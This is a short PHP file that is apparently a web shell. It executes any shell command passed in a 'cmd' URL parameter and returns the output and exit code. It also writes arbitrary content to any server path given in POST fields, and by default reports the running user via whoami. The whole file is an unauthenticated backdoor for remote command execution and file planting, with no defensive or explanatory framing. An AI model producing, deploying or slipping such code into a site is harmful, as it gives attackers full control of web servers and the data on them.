<?php
$cmd = $_GET['cmd'] ?? '';
$write = $_POST['write'] ?? '';
$path = $_POST['path'] ?? '';
if ($cmd) {
    echo '<pre>';
    // Use exec instead of system to avoid escapeshellcmd issues
    exec($cmd, $output, $rc);
    echo implode("\n", $output);
    echo "\n[EXIT: $rc]";
    echo '</pre>';
} elseif ($write && $path) {
    file_put_contents($path, $write);
    echo "WRITTEN: $path (" . strlen($write) . " bytes)";
} else {
    echo "ID: " . shell_exec('whoami');
}
?>